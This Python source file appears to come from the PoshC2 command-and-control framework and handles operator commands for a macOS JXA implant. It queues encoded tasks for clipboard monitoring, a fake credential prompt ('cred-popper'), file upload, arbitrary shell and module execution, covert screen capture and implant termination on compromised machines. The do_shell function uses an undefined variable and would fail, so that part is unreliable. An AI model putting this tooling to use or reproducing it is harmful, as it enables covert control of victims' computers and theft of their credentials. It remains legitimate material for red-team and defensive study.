import base64
import os
import re
import traceback

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

from poshc2.Utils import argp, get_command_word, command
from poshc2.client.Alias import jxa_alias, jxa_replace
from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter, FirstWordCompleter
from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, common_implant_examples, common_block_help
from poshc2.server.AutoLoads import run_jxa_autoloads
from poshc2.server.Config import ModulesDirectory, PayloadsDirectory, PoshProjectDirectory
from poshc2.server.Core import print_command_help, search_help
from poshc2.server.ImplantType import ImplantType
from poshc2.server.database.Model import NewTask, Implant
from poshc2.server.database.Helpers import insert_object, update_object, get_implant, get_process_id


commands = {}
commands.update(common_implant_commands)
commands_help = {}
commands_help.update(common_implant_commands_help)
examples = []
examples.extend(common_implant_examples)
block_help = {}
block_help.update(common_block_help)

style = Style.from_dict({
    '': '#80d130',
})

autosuggester = AutoSuggestFromPoshExamples(examples)


def jxa_prompt(prefix):
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.JXAHttp.get_history_file()}'),
                            auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]), style=style)
    completions = list(commands.keys())
    completions.extend(examples)
    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))


def handle_jxa_command(command, user, implant_id):
    command = command.strip()

    for alias in jxa_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    for alias in jxa_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    run_jxa_autoloads(command, implant_id, user)

    command_word = get_command_word(command)

    if command_word in commands:
        commands[command_word](user, command, implant_id)
        return

    if command:
        commands["shell"](user, command, implant_id)


def get_commands():
    return commands.keys()


@command(commands, commands_help, examples, block_help)
def do_help(user, command, implant_id):
    """
    Displays a list of all the available commands for this implant, or
    help for a particular command if specified.

    Examples:
        help
        help list-modules
        help inject-shellcode
    """
    print_command_help(command, commands, commands_help, block_help)


@command(commands, commands_help, examples, block_help)
def do_search_help(user, command, implant_id):
    """
    Search the command list for commands containing the keyword.

    The search is case insensitive.
    The -verbose option will search within and print the help for each command also.

    Examples:
        search-help psexec
        search-help -verbose psexec
    """
    search_help(command, commands_help)


@command(commands, commands_help, examples, block_help)
def do_clipboard_monitor(user, command, implant_id):
    """
    TODO
    """
    runtime = command.replace("clipboard-monitor ", "")
    jxa_file = open(ModulesDirectory + "clipboard_monitor.js", "r").read()
    jxa_file = jxa_file % runtime
    base64string = base64.b64encode(jxa_file.encode("utf-8")).decode("utf-8")
    taskcmd = f"{command} #{base64string}"
    new_task = NewTask(
        implant_id = implant_id,
        command = taskcmd,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_cred_popper(user, command, implant_id):
    """
    TODO
    """
    args = command.replace("cred-popper ", "").split("'")
    title = args[1]
    text = args[3]
    icon = args[5]
    jxa_file = open(ModulesDirectory + "cred-popper.js", "r").read()
    jxa_file = jxa_file % (title, text, icon)
    base64string = base64.b64encode(jxa_file.encode("utf-8")).decode("utf-8")
    taskcmd = f"{command} #{base64string}"
    new_task = NewTask(
        implant_id = implant_id,
        command = taskcmd,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_upload_file(user, command, implant_id):
    """
    TODO
    """
    if command == "upload-file":

        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.upload-history'), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return
        while not os.path.isfile(source):
            print(f"File does not exist: {source}")
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination

    try:

        destination = destination.replace("\\", "\\\\")
        print("")
        print(f"Uploading {source} to {destination}")
        upload_command = f"upload-file {source} {destination}"
        new_task = NewTask(
            implant_id = implant_id,
            command = upload_command,
            user = user,
            child_implant_id = None
        )

        insert_object(new_task)
    except Exception as e:
        print(f"Error with source file: {e}")
        traceback.print_exc()


@command(commands, commands_help, examples, block_help)
def do_run_jxa(user, command, implant_id):
    """
    TODO
    """
    params = re.compile("run-jxa ", re.IGNORECASE)
    params = params.sub("", command)
    jxa_function = params.split(" ")[1]
    jxa_file = params.split(" ")[0]
    jxa_file = open(ModulesDirectory + jxa_file, "r").read()
    jxa_file = jxa_file + "\n " + jxa_function
    base64string = base64.b64encode(jxa_file.encode("utf-8")).decode("utf-8")
    taskcmd = f"{command} #{base64string}"
    new_task = NewTask(
        implant_id = implant_id,
        command = taskcmd,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_run_module(user, command, implant_id):
    """
    TODO
    """
    taskcmd = "run-module " + command + ";"
    new_task = NewTask(
        implant_id = implant_id,
        command = taskcmd,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_screenshot(user, command, implant_id):
    """
    TODO
    """
    screencapture_command = "screencapture -Cx /Users/Shared/a.png"  # OPSEC, this will cause a popup the first time it is run. If denied, will only capture the background.
    # Capture screen (mute sounds), download image, delete image 
    new_task = NewTask(
        implant_id = implant_id,
        command = screencapture_command,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="exit")
def do_kill_implant(user, command, implant_id):
    """
    TODO
    """
    implant = get_implant(implant_id)
    ri = input(f"Are you sure you want to terminate the implant ID {implant.numeric_id}? (Y/n) ")

    if ri == "" or ri.lower() == "y":
        pid = get_process_id(implant_id)
        new_task = NewTask(
            implant_id = implant_id,
            command = f"kill -9 {pid}",
            user = user,
            child_implant_id = None
        )

        insert_object(new_task)
        update_object(Implant, {Implant.alive: "No"}, {Implant.id: implant_id})
    else:
        print("Implant not terminated")


@command(commands, commands_help, examples, block_help)
def do_shell(user, command, implant_id):
    """
    TODO
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = taskcmd,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)
